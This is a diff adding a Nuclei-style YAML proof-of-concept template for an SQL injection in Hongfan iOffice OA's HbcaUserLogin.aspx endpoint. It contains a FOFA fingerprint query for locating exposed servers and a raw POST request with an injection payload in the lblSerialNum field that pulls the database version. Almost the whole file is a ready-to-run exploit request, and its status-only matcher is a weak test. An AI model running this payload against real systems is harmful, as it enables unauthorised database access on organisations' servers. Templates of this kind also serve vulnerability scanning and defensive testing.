@@ -1,0 +1,36 @@
+id: poc-4693783130
+info:
+  name: 红帆OA HbcaUserLogin 存在SQL注入漏洞_ssm7gs9oda2fhdme
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: sqli,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: title="iOffice.net" || body="/iOffice/js" || (body="iOffice.net" && header!="couchdb" && header!="drupal") || body="iOfficeOcxSetup.exe" || body="Hongfan. All Rights Reserved"
+http:
+- raw:
+  - 'POST /ioffice/Identity/HbcaUserLogin.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    X-MicrosoftAjax: Delta=true
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
+
+    Cache-Control: no-cache
+
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTEyMTUyMDIxNTRkZP07H79WIvd3R0It8GvgZeNLQtUV&__VIEWSTATEGENERATOR=65AD83CA&lblSerialNum=''-1|@@VERSION--&btVerify='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
